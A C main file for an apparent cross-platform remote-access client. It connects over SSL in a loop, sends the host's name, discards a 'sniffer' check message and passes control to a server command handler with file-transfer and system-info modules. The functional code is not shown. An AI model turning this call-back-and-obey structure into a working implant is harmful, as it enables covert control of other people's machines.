#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <openssl/ssl.h>

#ifdef _WIN64
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "Ws2_32.lib")
    #include "Windows/socket.h"
    #include "Windows/systeminfo.h"
    #include "Windows/send_receive.h"
    #include "Windows/file_transfer.h"
    #else
    #include "Linux/file_transfer.h"
    #include "Linux/send_receive.h"
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include "Linux/socket.h"
    #include "Linux/systeminfo.h"
#endif

#include "Generic/string_manipulation.h"
#include "Generic/server_handler.h"
#include "Generic/hash_file.h"

int main() {
    while(true) {
        puts("connecting");
        SSL* ssl = ssl_connection();
        if (ssl == NULL) {
            return EXIT_FAILURE;
        }
        authentication();
        char* hostname = get_hostname();
        send_data(ssl, hostname);
        //free(hostname);
        char* sniffer_dummy = receive_data(ssl);
        free(sniffer_dummy);
        server_handler(ssl);
        #ifdef _WIN64
            closesocket(SSL_get_fd(ssl));
        #else
            close(SSL_get_fd(ssl));
        #endif
    }
}
